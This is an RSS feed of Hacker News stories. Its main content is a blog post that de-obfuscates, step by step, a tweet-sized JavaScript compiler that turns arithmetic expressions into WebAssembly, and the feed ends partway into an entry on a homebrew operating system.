<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Fri, 24 Jan 2025 20:30:03 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Subpixel Snake [video] (121 pts)]]></title>
            <link>https://www.youtube.com/watch?v=iDwganLjpW0</link>
            <guid>42815288</guid>
            <pubDate>Fri, 24 Jan 2025 17:21:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/watch?v=iDwganLjpW0">https://www.youtube.com/watch?v=iDwganLjpW0</a>, See on <a href="https://news.ycombinator.com/item?id=42815288">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[A WebAssembly compiler that fits in a tweet (135 pts)]]></title>
            <link>https://wasmgroundup.com/blog/wasm-compiler-in-a-tweet/</link>
            <guid>42814948</guid>
            <pubDate>Fri, 24 Jan 2025 16:51:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wasmgroundup.com/blog/wasm-compiler-in-a-tweet/">https://wasmgroundup.com/blog/wasm-compiler-in-a-tweet/</a>, See on <a href="https://news.ycombinator.com/item?id=42814948">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="__blog-post-container" itemprop="articleBody">
<!-- -->
<!-- -->
<!-- -->
<h2>Introduction</h2>
<p>One of the initial explorations that started this book was how small and simple a compile-to-WebAssembly language implemented in JavaScript could be. Our first “WebAssembly compiler in a tweet” was 269 bytes; since then, we’ve managed to whittle it down to a measly 192 bytes.</p>
<p>The final result is a compiler that takes an arithmetic expression — written in reverse polish notation — and compiles it down to a valid WebAssembly module. That module exports a single function which returns the result of the original arithmetic expression. Here it is:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let c=(b,l)=&gt;WebAssembly.instantiate(new Int8Array(</span></p></div><div><p><span>[,97,115,109,1,,,,1,5,1,96,,1,127,3,2,1,,7,4,1,,,,10,</span></p></div><div><p><span>l=(b=b.split` `.flatMap(t=&gt;t&gt;-1?[65,t]:107+'-*/'.indexOf(t)))</span></p></div><div><p><span>.length+4,1,l-2,,...b,11]))</span></p></div><br></code></p></div>
<p>And here’s an example of how you can use it:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>(await c('11 11 1 - + 4 * 2 /')).instance.exports['']()</span></p></div><br></code></p></div>
<p>But this is not just a clever trick — if you take the time to understand what this code does, you’ll learn a surprising amount about WebAssembly! In the rest of the post, we’ll explain how it all works by de-obfuscating the code one step at a time.</p>
<p>You can play with the code in this post here: <a href="https://stackblitz.com/edit/rpn-to-wasm-js-compiler?file=index.js" target="_blank" rel="noopener noreferrer">stackblitz.com/edit/rpn-to-wasm-js-compiler</a>.</p>
<h2>Format</h2>
<p>The first thing we can do to make it more readable is to format it:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let c1 = (b, l) =&gt;</span></p></div><div><p><span>  WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      , 97, 115, 109, 1, , , , 1, 5, 1, 96, , 1, 127, 3, 2, 1, , 7, 4, 1, , , , 10,</span></p></div><div><p><span>      (l = (b = b.split` `.flatMap(</span></p></div><div><p><span>            (t) =&gt; t &gt; -1 ? [65, t] : 107 + "-*/".indexOf(t)</span></p></div><div><p><span>           )).length + 4),</span></p></div><div><p><span>      1, l - 2, , ...b, 11</span></p></div><div><p><span>    ])</span></p></div><div><p><span>  );</span></p></div><br></code></p></div>
<p>While it’s still pretty unreadable, now we can at least identify different parts of the code.</p>
<p>At a high level, what we’re doing is ‘parsing’ the expression in a very simple way, turning it into the appropriate Wasm bytecode,
and then hand-crafting the bytes for a single-function module.</p>
<p>In a more complex compiler you would probably use a library to generate the WebAssembly module and compile the expressions but our main metric
here is code size so we write the bytes directly in an array.</p>
<h2>Remove Assignment Expression</h2>
<p>The first trick to undo is the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Assignment" target="_blank" rel="noopener noreferrer">assignment expression</a>.</p>
<p>In JavaScript the assignment operator is an expression. This means that it generates a result after evaluating, as you can see in the following examples:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let a, b;</span></p></div><div><p><span>console.log('a', a = 42);</span></p></div><div><p><span>a = b = 43;</span></p></div><div><p><span>console.log('b', b);</span></p></div><br></code></p></div>
<p>The code above will output:</p>

<p>This is because <code>a = 42</code> assigns <code>42</code> to <code>a</code> and the whole assignment expression evaluates to the value being assigned.</p>
<p>In <code>a = b = 43</code>, we assign the result of evaluating <code>b = 43</code> to <code>a</code>. This equivalent expression may be easier to understand: <code>a = (b = 43)</code>.</p>
<p>In our code, we use this trick to reuse variables and update their value in places where
we can also use the value being assigned. It also allows us to have our compiler in a single expression, avoiding the need for curly braces, semicolons and return statements.</p>
<p>To undo it, we turn the body of our function into a block and do each assignment on its own line:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let c2 = (b, l) =&gt; {</span></p></div><div><p><span>  b = b.split` `.flatMap(</span></p></div><div><p><span>    (t) =&gt; (t &gt; -1 ? [65, t] : 107 + "-*/".indexOf(t))</span></p></div><div><p><span>  );</span></p></div><div><p><span>  l = b.length + 4;</span></p></div><div><p><span>  return WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      , 97, 115, 109, 1, , , , 1, 5, 1, 96, , 1, 127, 3, 2, 1, , 7, 4, 1, , , ,</span></p></div><div><p><span>      10, l, 1, l - 2, , ...b, 11</span></p></div><div><p><span>    ]),</span></p></div><div><p><span>  );</span></p></div><div><p><span>};</span></p></div><br></code></p></div>
<h2>Undo Variable Tricks</h2>
<p>Now the assignments are easier to identify but the meaning of variables and function
arguments are still hard to understand. Let’s fix that by undoing a couple of variable tricks.</p>
<p>The first step is to stop using single letter variables, and to use more descriptive names instead. The next step is to stop reusing variables: for example, <code>b</code> initially holds the code to compile, but once we don’t need that any more we reuse it to hold the bytecode instructions.</p>
<p>To undo this we are going to introduce a new <code>instrs</code> variable and rename <code>b</code> to <code>code</code>. We’ll also rename <code>l</code> to <code>len</code>. This variable contains a value that is close to the number of bytecodes.</p>
<p>By declaring <code>l</code> in the body we can remove it from the function argument’s list. We did this
as a trick to avoid the need to declare it with <code>let</code> or <code>const</code>, saving some bytes and the need for a function body.</p>
<p>The trick works by adding unused arguments at the end of the function argument list and using them as local variables. Our compiler function expects a single argument with the code; <code>l</code> is there for us to use since we don’t expect the caller to provide any value for it.</p>
<p>Here’s the code without this trick:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let c3 = (code) =&gt; {</span></p></div><div><p><span>  const instrs = code.split` `.flatMap(</span></p></div><div><p><span>    (t) =&gt; (t &gt; -1 ? [65, t] : 107 + "-*/".indexOf(t))</span></p></div><div><p><span>  );</span></p></div><div><p><span>  const len = instrs.length + 4;</span></p></div><div><p><span>  return WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      , 97, 115, 109, 1, , , , 1, 5, 1, 96, , 1, 127, 3, 2, 1, , 7, 4, 1, , , ,</span></p></div><div><p><span>      10, len, 1, len - 2, , ...instrs, 11</span></p></div><div><p><span>    ]),</span></p></div><div><p><span>  );</span></p></div><div><p><span>};</span></p></div><br></code></p></div>
<h2>Add Missing Zeros</h2>
<p>If you look at the array in our code, you may notice that there are many commas followed by another comma instead of a value. This syntax defines “sparse arrays”. Here’s an example:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>const a1 = [,,];</span></p></div><div><p><span>console.log(a1.length); // Output: 2</span></p></div><div><p><span>console.log(a1); // Output: [ &lt;2 empty items&gt; ]</span></p></div><br></code></p></div>
<p>Which is equivalent to:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>const a2 = new Array(2);</span></p></div><div><p><span>console.log(a2.length); // Output: 2</span></p></div><div><p><span>console.log(a2); // Output: [ &lt;2 empty items&gt; ]</span></p></div><br></code></p></div>
<p>We use this syntactic trick to save one byte each time we need a <code>0</code> to appear in the array. This works because <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Typed_arrays" target="_blank" rel="noopener noreferrer">Typed Arrays</a> coerce all array items to numbers, and an “empty item” will be converted to 0:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>new Int8Array([0, null, undefined,,0])</span></p></div><br></code></p></div>
<p>which produces:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>Int8Array(5) [ 0, 0, 0, 0, 0 ]</span></p></div><br></code></p></div>
<p>Let’s undo this trick by adding all the zeroes back:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let c4 = (code) =&gt; {</span></p></div><div><p><span>  const instrs = code.split` `.flatMap(</span></p></div><div><p><span>    (t) =&gt; (t &gt; -1 ? [65, t] : 107 + "-*/".indexOf(t))</span></p></div><div><p><span>  );</span></p></div><div><p><span>  const len = instrs.length + 4;</span></p></div><div><p><span>  return WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 7, 4, 1, 0, 0, 0,</span></p></div><div><p><span>      10, len, 1, len - 2, 0, ...instrs, 11</span></p></div><div><p><span>    ]),</span></p></div><div><p><span>  );</span></p></div><div><p><span>};</span></p></div><br></code></p></div>
<h2>Remove Extra 4 bytes on Length Definition</h2>
<p>In our code, we have a variable <code>len</code> that contains a number that is close to the number
of bytecodes in the compiled expression, but not exactly the same:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>  const len = instrs.length + 4;</span></p></div><br></code></p></div>
<p>In the WebAssembly module we need to use the number of bytes in the function body (the expression to evaluate) in two places:</p>
<ul>
<li>To define the code section’s length</li>
<li>To define the function body’s length</li>
</ul>
<p>Since there’s only one function in the code section both values are similar:</p>
<ul>
<li>The section takes two extra bytes (section identifier and number of code entries)</li>
<li>The function body takes another two bytes (number of locals and <code>end</code> instruction)</li>
</ul>
<p>To avoid writing <code>b.length</code> twice we assign to <code>l</code> the value of <code>b.length + 4</code> in the place where we need the code section byte count
and then calculate <code>l - 2</code> (<code>b.length + 2</code>) where we need the function body byte count.</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>[</span></p></div><div><p><span>  ...</span></p></div><div><p><span>  l=(b=b.split` `.flatMap(t=&gt;t&gt;-1?[65,t]:107+'-*/'.indexOf(t))).length+4,1,l-2</span></p></div><div><p><span>  ...</span></p></div><div><p><span>]</span></p></div><br></code></p></div>
<p>This is all a trick to avoid having to write <code>b.length</code> twice.</p>
<p>let’s assign the length to <code>len</code> and calculate the right value in each place:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let c5 = (code) =&gt; {</span></p></div><div><p><span>  const instrs = code.split` `.flatMap(</span></p></div><div><p><span>    (t) =&gt; (t &gt; -1 ? [65, t] : 107 + "-*/".indexOf(t))</span></p></div><div><p><span>  );</span></p></div><div><p><span>  const len = instrs.length;</span></p></div><div><p><span>  return WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 7, 4, 1, 0, 0, 0,</span></p></div><div><p><span>      10, 4 + len, 1, 2 + len, 0, ...instrs, 11</span></p></div><div><p><span>    ]),</span></p></div><div><p><span>  );</span></p></div><div><p><span>};</span></p></div><br></code></p></div>
<h2>Remove String Template Literal Instead of Function Call</h2>
<p>The next trick to undo is <code>code.split` `</code>. In this case, we use the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates" target="_blank" rel="noopener noreferrer">Tagged Template</a> feature of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals" target="_blank" rel="noopener noreferrer">String Template Literals</a>.</p>
<p>Let’s see how it works by creating a simple tagged template that turns the string to uppercase:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>function upper(s) {</span></p></div><div><p><span>  return s[0].toUpperCase();</span></p></div><div><p><span>}</span></p></div><br></code></p></div>
<p>And use it:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>upper`Hello, World!`</span></p></div><div><p><span>&gt; "HELLO, WORLD!"</span></p></div><br></code></p></div>
<p>As you can see, the first argument to the tagged template function is an array. Luckily for us, the first argument of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/split#separator" target="_blank" rel="noopener noreferrer">String.prototype.split</a> is handled in the following way:</p>
<blockquote>
<p>All values that are not undefined or objects with a <code>[Symbol.split]()</code> method are coerced to strings.</p>
</blockquote>
<p>And coercing an array with one string in it is the same as the string itself:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>["hello"].toString()</span></p></div><div><p><span>&gt; "hello"</span></p></div><br></code></p></div>

<p>Since the function we want to call takes a single string argument, we can use it as a tagged template and save the parentheses in the function call.</p>
<p>Let’s write it as a function call instead:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let c6 = (code) =&gt; {</span></p></div><div><p><span>  const instrs = code.split(' ').flatMap(</span></p></div><div><p><span>    (t) =&gt; (t &gt; -1 ? [65, t] : 107 + "-*/".indexOf(t))</span></p></div><div><p><span>  );</span></p></div><div><p><span>  const len = instrs.length;</span></p></div><div><p><span>  return WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 7, 4, 1, 0, 0, 0,</span></p></div><div><p><span>      10, 4 + len, 1, 2 + len, 0, ...instrs, 11</span></p></div><div><p><span>    ]),</span></p></div><div><p><span>  );</span></p></div><div><p><span>};</span></p></div><br></code></p></div>
<h2>Remove the Ternary Operator</h2>
<p>Next, let’s undo the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Conditional_operator" target="_blank" rel="noopener noreferrer">Ternary Operator</a> and turn it into an <em>if</em> statement.</p>
<p>The ternary operator has expressions on each branch saving us the <code>return</code> statements. Here’s what the code looks like when we use an <em>if</em> statement instead:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let c7 = (code) =&gt; {</span></p></div><div><p><span>  const instrs = code.split(" ").flatMap((t) =&gt; {</span></p></div><div><p><span>    if (t &gt; -1) {</span></p></div><div><p><span>      return [65, t];</span></p></div><div><p><span>    } else {</span></p></div><div><p><span>      return 107 + "-*/".indexOf(t);</span></p></div><div><p><span>    }</span></p></div><div><p><span>  });</span></p></div><div><p><span>  const len = instrs.length;</span></p></div><div><p><span>  return WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 7, 4, 1, 0, 0, 0,</span></p></div><div><p><span>      10, 4 + len, 1, 2 + len, 0, ...instrs, 11</span></p></div><div><p><span>    ]),</span></p></div><div><p><span>  );</span></p></div><div><p><span>};</span></p></div><br></code></p></div>
<h2>Remove Number Check With Coercion</h2>
<p>The next trick to undo is the one present twice in the following code:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>    if (t &gt; -1) {</span></p></div><div><p><span>      return [65, t];</span></p></div><div><p><span>    }</span></p></div><br></code></p></div>
<p>First we use coercion in <code>t &gt; -1</code> to check if the token <code>t</code> is a string representing a
positive number. Then we use coercion again in <code>[65, t]</code> to let JavaScript turn <code>t</code> into a <code>Number</code> in the <code>Int8Array</code>:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>new Int8Array([65, '42'])</span></p></div><br></code></p></div>
<p>The code above evaluates to:</p>

<p>Let’s write the parsing and checking explicitly:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let c8 = (code) =&gt; {</span></p></div><div><p><span>  const instrs = code.split(" ").flatMap((t) =&gt; {</span></p></div><div><p><span>    const num = parseInt(t, 10);</span></p></div><div><p><span>    if (Number.isFinite(num)) {</span></p></div><div><p><span>      return [65, num];</span></p></div><div><p><span>    } else {</span></p></div><div><p><span>      return 107 + "-*/".indexOf(t);</span></p></div><div><p><span>    }</span></p></div><div><p><span>  });</span></p></div><div><p><span>  const len = instrs.length;</span></p></div><div><p><span>  return WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 7, 4, 1, 0, 0, 0,</span></p></div><div><p><span>      10, 4 + len, 1, 2 + len, 0, ...instrs, 11</span></p></div><div><p><span>    ]),</span></p></div><div><p><span>  );</span></p></div><div><p><span>};</span></p></div><br></code></p></div>
<p>The semantics of our compiler change a little bit here. The original version will only accept
positive integers as input; if you want a negative number you have to subtract from zero: <code>0 - 1</code> to get <code>-1</code>. The new version allows negative numbers since it checks with <code>Number.isFinite(num)</code> instead of <code>t &gt; -1</code>.</p>
<h2>Remove indexOf -1 Trick</h2>
<p>The next trick is in the <em>else</em> branch:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>      return 107 + "-*/".indexOf(t);</span></p></div><br></code></p></div>
<p>Our calculator compiler only accepts four arithmetic operations: <code>+</code>, <code>-</code>, <code>*</code>, and <code>/</code>. But
in the code above you can only see three: <code>-*/</code> and a magical number: <code>107</code>. Here’s how it works — these are the bytecode numbers for arithmetic operations in WebAssembly:</p>
<ul>
<li><code>+</code>: <code>106</code></li>
<li><code>-</code>: <code>107</code></li>
<li><code>*</code>: <code>108</code></li>
<li><code>/</code>: <code>109</code></li>
</ul>
<p>We only enter this branch if the token <code>t</code> is not a number, which means it can only be
one of the arithmetic operators above. So, given a single character which is one of those four operators, we want to produce the appropriate opcode.</p>
<p>We <em>could</em> have written <code>106 + "+-*/".indexOf(t)</code>. That is, we find the symbol’s index in the string:</p>
<ul>
<li><code>+</code>: <code>0</code></li>
<li><code>-</code>: <code>1</code></li>
<li><code>*</code>: <code>2</code></li>
<li><code>/</code>: <code>3</code></li>
</ul>
<p>…and add <code>106</code> to it to get the bytecode number. But when <code>t</code> is not in the string, <code>"+-*/"</code> <code>indexOf</code> returns <code>-1</code>. We can use that to our advantage, and treat <code>-1</code> to mean “plus or any other token”:</p>
<ul>
<li><code>+</code>: <code>-1</code> (any other token will be <code>-1</code> too)</li>
<li><code>-</code>: <code>0</code></li>
<li><code>*</code>: <code>1</code></li>
<li><code>/</code>: <code>2</code></li>
</ul>
<p>And that’s why we add <code>107</code> instead of <code>106</code>. Let’s undo the <code>-1</code> trick:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>let c9 = (code) =&gt; {</span></p></div><div><p><span>  const instrs = code.split(" ").flatMap((t) =&gt; {</span></p></div><div><p><span>    const num = parseInt(t, 10);</span></p></div><div><p><span>    if (Number.isFinite(num)) {</span></p></div><div><p><span>      return [65, num];</span></p></div><div><p><span>    } else {</span></p></div><div><p><span>      return 106 + "+-*/".indexOf(t);</span></p></div><div><p><span>    }</span></p></div><div><p><span>  });</span></p></div><div><p><span>  const len = instrs.length;</span></p></div><div><p><span>  return WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 7, 4, 1, 0, 0, 0,</span></p></div><div><p><span>      10, 4 + len, 1, 2 + len, 0, ...instrs, 11</span></p></div><div><p><span>    ]),</span></p></div><div><p><span>  );</span></p></div><div><p><span>};</span></p></div><br></code></p></div>
<p>Here again the semantics change a little bit. Before, if the token <code>t</code> wasn’t found, the expression would evaluate to <code>107 + -1</code> which would map to an addition. Now it will evaluate to <code>106 + -1</code> which will map to bytecode <code>105</code> which is the <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Reference/Numeric/Population_count" target="_blank" rel="noopener noreferrer"><code>popcnt</code></a> instruction.</p>
<p>But don’t worry, we’ll fix it in the next step.</p>
<h2>Remove indexOf Trick</h2>
<p>After explaining how the <code>indexOf</code> trick works and removing the <code>-1</code> part, let’s
go ahead and remove the trick completely. To do it we are going to create an object that maps from an arithmetic operation token to its bytecode:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>const OP_TO_BYTECODE = {</span></p></div><div><p><span>  "+": 106,</span></p></div><div><p><span>  "-": 107,</span></p></div><div><p><span>  "*": 108,</span></p></div><div><p><span>  "/": 109,</span></p></div><div><p><span>};</span></p></div><div><p><span>let c10 = (code) =&gt; {</span></p></div><div><p><span>  const instrs = code.split(" ").flatMap((t) =&gt; {</span></p></div><div><p><span>    const num = parseInt(t, 10);</span></p></div><div><p><span>    if (Number.isFinite(num)) {</span></p></div><div><p><span>      return [65, num];</span></p></div><div><p><span>    } else {</span></p></div><div><p><span>      return OP_TO_BYTECODE[t] ?? 106;</span></p></div><div><p><span>    }</span></p></div><div><p><span>  });</span></p></div><div><p><span>  const len = instrs.length;</span></p></div><div><p><span>  return WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 7, 4, 1, 0, 0, 0,</span></p></div><div><p><span>      10, 4 + len, 1, 2 + len, 0, ...instrs, 11</span></p></div><div><p><span>    ]),</span></p></div><div><p><span>  );</span></p></div><div><p><span>};</span></p></div><br></code></p></div>
<p>To keep the initial semantics, if the token is not a valid operation we return the bytecode for <code>+</code>: in <code>OP_TO_BYTECODE[t] ?? 106</code>.</p>
<h2>Remove the Empty Export Name</h2>
<p>From the usage example at the beginning of the post, you may have noticed that the exported
function’s name is the empty string:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>(await c('11 11 1 - + 4 * 2 /')).instance.exports['']()</span></p></div><br></code></p></div>
<p>We did this to save us the bytes needed to specify the export name,
but also to save an extra byte/character in the code because with the length of the export name being <code>0</code>
we can use the sparse array syntax to leave an empty spot in the WebAssembly module array.</p>
<p>To revert this trick we are going to name the exported function as <code>a</code>, which in UTF-8 is the byte <code>97</code>:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>&gt; new TextEncoder().encode('a')[0]</span></p></div><div><p><span>97</span></p></div><br></code></p></div>
<div data-ch-theme="nord"><p><code><br><div><p><span>const OP_TO_BYTECODE = {</span></p></div><div><p><span>  "+": 106,</span></p></div><div><p><span>  "-": 107,</span></p></div><div><p><span>  "*": 108,</span></p></div><div><p><span>  "/": 109,</span></p></div><div><p><span>};</span></p></div><div><p><span>let c11 = (code) =&gt; {</span></p></div><div><p><span>  const instrs = code.split(" ").flatMap((t) =&gt; {</span></p></div><div><p><span>    const num = parseInt(t, 10);</span></p></div><div><p><span>    if (Number.isFinite(num)) {</span></p></div><div><p><span>      return [65, num];</span></p></div><div><p><span>    } else {</span></p></div><div><p><span>      return OP_TO_BYTECODE[t] ?? 106;</span></p></div><div><p><span>    }</span></p></div><div><p><span>  });</span></p></div><div><p><span>  const len = instrs.length;</span></p></div><div><p><span>  return WebAssembly.instantiate(</span></p></div><div><p><span>    new Int8Array([</span></p></div><div><p><span>      0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 7, 5, 1, 1, 97, 0, 0,</span></p></div><div><p><span>      10, 4 + len, 1, 2 + len, 0, ...instrs, 11</span></p></div><div><p><span>    ]),</span></p></div><div><p><span>  );</span></p></div><div><p><span>};</span></p></div><br></code></p></div>
<p>We can now call it with a nicer name:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>(await c11('11 11 1 - + 4 * 2 /')).instance.exports.a()</span></p></div><br></code></p></div>
<h2>Implicit Design Decisions</h2>
<p>Our initial implementation only supported positive numbers, but that’s not the only number restriction in our compiler.</p>
<p>To keep WebAssembly modules as small as possible, numbers are encoded using a variable-length encoding algorithm called <a href="https://en.wikipedia.org/wiki/LEB128" target="_blank" rel="noopener noreferrer">LEB128</a>. You can tell we are not implementing the whole algorithm by looking at the part of the code that encodes numbers: <code>[65,t]</code>. We’re assuming the number being encoded fits in 7 bits, the shortest possible LEB128 representation.</p>
<p>Let’s try the limits of our implementation:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>(await c('63')).instance.exports['']();</span></p></div><div><p><span>&gt; 63</span></p></div><br></code></p></div>
<div data-ch-theme="nord"><p><code><br><div><p><span>(await c('64')).instance.exports['']();</span></p></div><div><p><span>&gt; -64</span></p></div><br></code></p></div>
<p>This means the only numbers that will be parsed correctly are from <code>0</code> to <code>63</code>.</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>(await c('127')).instance.exports['']();</span></p></div><div><p><span>&gt; -1</span></p></div><br></code></p></div>
<div data-ch-theme="nord"><p><code><br><div><p><span>(await c('128')).instance.exports['']();</span></p></div><br></code></p></div>
<p>Fails with:</p>
<blockquote>
<p>Uncaught CompileError: WebAssembly.instantiate(): Compiling function #0 failed: function body must end with “end” opcode @+33</p>
</blockquote>
<p>In the last one we went over the 7 bits and the module was rejected during validation.</p>
<p>Explaining and implementing LEB128 takes a lot of text and code. If you want to read more
about it we have a whole deep dive on LEB128 in <a href="https://wasmgroundup.com/" target="_blank" rel="noopener noreferrer">our book</a>.</p>
<h2>A Trick that Almost Worked</h2>
<p>During the code golfing phase I had a literal shower thought but sadly it didn’t work.</p>
<p>The idea was to simplify <code>106 + "+-*/".indexOf(t)</code> by using the UTF-8 character code plus an offset like this: <code>63 + t.charCodeAt()</code> and saving 3 bytes in the process. The reason it didn’t work is that the characters <code>+-*/</code> don’t appear in the same order in UTF-8 and WebAssembly bytecode.</p>
<h2>Explaining the Numbers in the Array</h2>
<p>The last part to expand/explain is the array of numbers used to build the WebAssembly module.</p>
<p>It takes a big part of a <a href="https://www.w3.org/TR/2019/REC-wasm-core-1-20191205/" target="_blank" rel="noopener noreferrer">specification</a> to explain every byte in the array, but here’s a commented version that should give you a high level idea of what each part does:</p>
<div data-ch-theme="nord"><p><code><br><div><p><span>    [</span></p></div><div><p><span>      // Wasm module magic number '\0asm'</span></p></div><div><p><span>      [0, 97, 115, 109],</span></p></div><div><p><span>      // Wasm version 1.0</span></p></div><div><p><span>      [1, 0, 0, 0],</span></p></div><div><p><span>      // ----- type section -----</span></p></div><div><p><span>      1, // Section identifier</span></p></div><div><p><span>      5, // Section size in bytes</span></p></div><div><p><span>      1, // Number of entries that follow</span></p></div><div><p><span>      // type section - entry 0</span></p></div><div><p><span>      96, // Type `function`</span></p></div><div><p><span>      0,  // Number of parameters</span></p></div><div><p><span>      1,  // Number of return values</span></p></div><div><p><span>      127, // return type i32</span></p></div><div><p><span>      // ----- function section -----</span></p></div><div><p><span>      3, // Section identifier</span></p></div><div><p><span>      2, // Section size in bytes</span></p></div><div><p><span>      1, // Number of entries that follow</span></p></div><div><p><span>      // function section - entry 0</span></p></div><div><p><span>      0, // Index of the type section entry</span></p></div><div><p><span>      // ----- export section -----</span></p></div><div><p><span>      7, // Section identifier</span></p></div><div><p><span>      5, // Section size in bytes</span></p></div><div><p><span>      1, // Number of entries that follow</span></p></div><div><p><span>      // export section - entry 0</span></p></div><div><p><span>      1,  // Name size in bytes</span></p></div><div><p><span>      97, // String as utf-8 bytes for 'a'</span></p></div><div><p><span>      0,  // Export type `function`</span></p></div><div><p><span>      0,  // Function Index</span></p></div><div><p><span>      // ----- code section -----</span></p></div><div><p><span>      10, // Section identifier</span></p></div><div><p><span>      4 + len, // Section size in bytes</span></p></div><div><p><span>      1, // Number of entries that follow</span></p></div><div><p><span>      // code section - entry 0</span></p></div><div><p><span>      2 + len, // Entry size in bytes</span></p></div><div><p><span>      0, // Number of local variables</span></p></div><div><p><span>      ...instrs,</span></p></div><div><p><span>      11, // `end` instruction</span></p></div><div><p><span>    ]</span></p></div><br></code></p></div>
<h2>Conclusion</h2>
<p>There you go! We’ve turned a rather opaque 192-byte snippet into something that’s almost readable. And in the process, you hopefully learned a little bit about WebAssembly.</p>
<p>If we dropped the size restrictions, there are lots of things we might want to improve in this compiler: handle numbers greater than 127, add nicer syntax, add support for conditionals, loops, etc. If you’re interested in what that might look like, I encourage you to check out our book <a href="https://wasmgroundup.com/" target="_blank" rel="noopener noreferrer">WebAssembly from the Ground Up</a>. You’ll learn the ins and outs of WebAssembly by writing a real compiler for a simple programming language. It’s a lot of fun!</p>
<p>Special thanks to <a href="https://bsky.app/profile/orthoplex.bsky.social" target="_blank" rel="noopener noreferrer">lexi</a> for contributing some of the tricks used above.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Snowdrop OS – a homebrew operating system from scratch, in assembly language (102 pts)]]></title>
            <link>http://sebastianmihai.com/snowdrop/</link>
            <guid>42814820</guid>
            <pubDate>Fri, 24 Jan 2025 16:40:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://sebastianmihai.com/snowdrop/">http://sebastianmihai.com/snowdrop/</a>, See on <a href="https://news.ycombinator.com/item?id=42814820">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="snowdrop-contentpanel">

<h2>Introduction section</h2>
<p>

Welcome to the pages of Snowdrop OS, my homebrew operating system project.
</p><p><img alt="" src="http://sebastianmihai.com/snowdrop/images/snowdrop-intro.jpg"></p>

